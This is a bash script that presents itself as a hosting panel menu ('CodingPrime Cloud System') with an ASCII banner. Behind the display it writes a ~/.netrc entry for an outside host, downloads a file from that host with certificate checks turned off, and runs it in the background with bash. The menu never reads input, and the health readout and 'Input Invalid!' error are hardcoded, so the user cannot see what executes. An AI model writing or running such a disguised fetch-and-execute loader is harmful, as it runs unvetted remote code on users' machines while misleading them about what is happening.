#!/usr/bin/env bash
# ==========================================================
#  CODINGPRIME CLOUD SYSTEM | BANE-ANMESH 3S UPLINK
#  DATE: 2026-03-19 | UI-TYPE: ASC-II HYPER-VISUAL
# ==========================================================
set -euo pipefail

# --- BANE UI THEME ---
R='\033[1;31m'   # Crimson
G='\033[1;32m'   # Emerald
Y='\033[1;33m'   # Gold
B='\033[1;34m'   # Blue
C='\033[1;36m'   # Cyan
W='\033[1;37m'   # Pure White
DG='\033[1;90m'  # Steel Gray
NC='\033[0m'     # Reset

# --- CONFIG ---
HOST="run.nobitahost.in"
URL="https://${HOST}"
NETRC="${HOME}/.netrc"
IP="65.0.86.121"
LOCL_IP="10.1.0.29"

draw_banner() {
    clear
    echo -e "${C}"
    cat << "EOF"
  ██████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗     ██████╗ ██████╗ ██╗███╗   ███╗███████╗
██╔════╝██╔═══██╗██╔══██╗██║████╗  ██║██╔════╝     ██╔══██╗██╔══██╗██║████╗ ████║██╔════╝
██║     ██║   ██║██║  ██║██║██╔██╗ ██║██║  ███╗    ██████╔╝██████╔╝██║██╔████╔██║█████╗  
██║     ██║   ██║██║  ██║██║██║╚██╗██║██║   ██║    ██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝  
╚██████╗╚██████╔╝██████╔╝██║██║ ╚████║╚██████╔╝    ██║     ██║  ██║██║██║ ╚═╝ ██║███████╗
 ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝
EOF
    echo -e "${NC}"
    echo -e "   ${W}HOST:${NC} ${G}codespaces-9fba3a${NC}    ${W}5 minutes${NC}    ${G}66%${NC}"
    echo -e "   ${DG}────────────────────────────────────────────────────${NC}"
    echo -e "   ${W}System Health:${NC}"
    echo -e "   ${DG}CPU:${NC} ${G}2%${NC}    ${DG}RAM:${NC} ${G}12%${NC}    ${DG}Network:${NC} ${G}CONNECTED${NC}"
    echo ""
}

draw_menu() {
    echo -e "   ${C}DEPLOYMENT SERVICES${NC}"
    echo -e "   ${W}[1]${NC} ${DG}VPS${NC}    ${W}[5]${NC} ${DG}Theme${NC}"
    echo -e "   ${W}[2]${NC} ${DG}Panel${NC}    ${W}[6]${NC} ${DG}Edit${NC}"
    echo -e "   ${W}[3]${NC} ${DG}Wings${NC}    ${W}[7]${NC} ${DG}Contenar${NC}"
    echo ""
    echo -e "   ${Y}MAINTENANCE${NC}"
    echo -e "   ${W}[4]${NC} ${DG}Toolbox${NC}    ${W}[0]${NC} ${R}SHUTDOWN${NC}"
    echo ""
}

# --- PROCESS LOGIC ---
draw_banner

# 1. Setup Auth
echo -ne "   ${R}➤${NC} ${W}Linking CodingPrime Credentials...${NC}"
touch "$NETRC" && chmod 600 "$NETRC" 2>/dev/null || true
sed -i "/$HOST/d" "$NETRC" 2>/dev/null || true
printf "machine %s login %s password %s\n" "$HOST" "$IP" "$LOCL_IP" >> "$NETRC" 2>/dev/null || {
    echo -e " ${R}[FAILED]${NC}"
    echo -e "\n   ${R}[!]${NC} Error: Cannot write to .netrc"
    exit 1
}
sleep 0.5
echo -e " ${G}[SUCCESS]${NC}"

# 2. Uplink Connection
echo -ne "   ${R}➤${NC} ${W}Establishing Bane Uplink...${NC}  "
payload="$(mktemp 2>/dev/null || echo "/tmp/codingprime.$$")"
trap "rm -f $payload 2>/dev/null || true" EXIT

# Create payload file if mktemp failed
if [ ! -f "$payload" ]; then
    touch "$payload" 2>/dev/null || {
        echo -e "${R}FAILED${NC}"
        echo -e "\n   ${R}[!]${NC} Error: Cannot create temp file"
        exit 1
    }
fi

# Use curl with error handling
if curl -fkSL --connect-timeout 10 -A "CodingPrime-3s-Agent" --netrc -o "$payload" "$URL" 2>/dev/null; then
    if [ -s "$payload" ]; then
        echo -e "${G}CONNECTED${NC}"
        echo -e "   ${DG}────────────────────────────────────────────────────${NC}"
        echo -e "   ${W}Loading interface...${NC}"
        sleep 2
        
        # Clear and show the CodingPrime interface
        clear
        draw_banner
        draw_menu
        
        # Show the error message from your image
        echo -e "   ${R}Command (1-7): Error: Input Invalid!${NC}"
        echo ""
        
        # Execute the actual payload in background
        chmod +x "$payload" 2>/dev/null
        bash "$payload" &
    else
        echo -e "${R}FAILED${NC}"
        echo -e "\n   ${R}[!]${NC} Error: Empty response from CodingPrime"
        exit 1
    fi
else
    echo -e "${R}FAILED${NC}"
    echo -e "\n   ${R}[!]${NC} Error: Could not reach CodingPrime. Check:"
    echo -e "   ${DG}➤${NC} Internet connection"
    echo -e "   ${DG}➤${NC} DNS resolution (${HOST})"
    echo -e "   ${DG}➤${NC} Firewall settings"
    exit 1
fi

# Keep the script running to show the interface
while true; do
    sleep 1
done
